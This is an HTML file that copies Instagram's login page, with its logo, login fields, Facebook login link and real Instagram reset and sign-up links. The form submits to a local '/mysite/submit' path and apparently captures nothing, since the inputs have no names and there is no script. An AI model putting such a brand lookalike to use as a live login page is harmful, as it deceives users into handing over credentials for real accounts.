<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>log-In</title>
    <link rel="stylesheet" href="styles.css">
</head>

<body>
    <div class="main-container">
        <div class="image-container">
        </div>
        <div class="container">
            <div class="logIn-container">
                <img src="insta.png" alt="instagram logo" class="insta">

                <form action="/mysite/submit">
                    <div class="content-container">
                        <input type="email" placeholder="Phone number, username, or email">
                        <input type="password" placeholder="Password">
                        <button>Log in</button>
                        <div class="or">
                            <div class="left"></div>
                            <div>OR</div>
                            <div class="right"></div>
                        </div>
                        <a href="https://m.facebook.com/login/?locale=en_EN&refsrc=deprecated" class="facebook-logIn">
                            <img src="facebook.png" class="facebook">
                            Log in with Facebook
                        </a>
                        <a href="https://www.instagram.com/accounts/password/reset/" class="pass">
                            Forgot password?
                        </a>
                    </div>
                </form>
            </div>
            <div class="signUp-container">
                <div class="account">
                    <p>Don't have an account ?
                        <a href="https://www.instagram.com/accounts/emailsignup/?hl=fr" class="signUp">
                            Sign up
                        </a>
                    </p>
                </div>
            </div>
            <div class="app-container">
                <div class="app">Get the app.</div>
                <div class="apps">
                    <img src="appStore.png" class="apple">
                    <img src="googlePlay.png" class="google">

                </div>
            </div>

        </div>

    </div>


    </div>


    <div class="links">
        <a>Meta</a>
        <a>About</a>
        <a>Blog</a>
        <a>Jobs</a>
        <a>Help</a>
        <a>API</a>
        <a>Privacy</a>
        <a>Terms</a>
        <a>Top Accounts</a>
        <a>Locations</a>
        <a>Instagram Lite</a>
        <a>Contact Uploading & Non-Users</a>

    </div>



</body>

</html>
